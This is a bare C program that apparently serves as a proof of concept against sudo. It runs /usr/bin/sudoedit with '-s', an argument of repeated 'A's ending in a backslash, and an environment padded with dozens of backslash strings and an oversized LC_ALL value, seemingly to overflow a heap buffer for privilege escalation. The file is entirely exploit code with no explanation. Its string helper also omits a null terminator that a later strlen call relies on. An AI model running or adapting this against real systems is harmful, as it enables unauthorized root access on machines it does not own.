#include <stdio.h>
#include <string.h>
#include <stdlib.h>
#include <stdint.h>
#include <sys/stat.h>
#include <stdlib.h>


char * str_repeat(char a, size_t n) {
    char * s = malloc(n);
    if (s) {
        memset(s, a, n);
    }
    return s;
}

char * concat(const char * a, const char * b) {
    size_t len_a = strlen(a);
    size_t len_b = strlen(b);
    size_t size = len_a + len_b;

    char * s = malloc(size+1);
    if (s) {
        memcpy(s, a, len_a);
        memcpy(s+len_a, b, len_b);
        s[size] = 0;
    }
    return s;
}

int main() {
    char *env[] = {
        "\\", "\\", "\\", "\\", "\\", "\\", "\\", "\\",
        "\\", "\\", "\\", "\\", "\\", "\\", "\\", "\\",
        "\\", "\\", "\\", "\\", "\\", "\\", "\\", "\\",
        "\\", "\\", "\\", "\\", "\\", "\\", "\\", "\\",
        "\\", "\\", "\\", "\\", "\\", "\\", "\\", "\\",
        "\\", "\\", "\\", "\\", "\\", "\\", "\\", "\\",
        "\\", "\\", "\\", "\\", "\\", "\\", "\\", "\\",
        "\\", "\\", "\\", "\\", "\\", "\\", "\\",
        "X/X",
        concat("LC_ALL=C.UTF-8@", str_repeat('A', 0xd0)),
        NULL
    };

    char * a = concat(str_repeat('A', 0x70),"\\");
    char * argv[] = {"/usr/bin/sudoedit", "-s", a, NULL};
    execve(argv[0], argv, env);

    puts("Execve failed");
    exit(1);
}
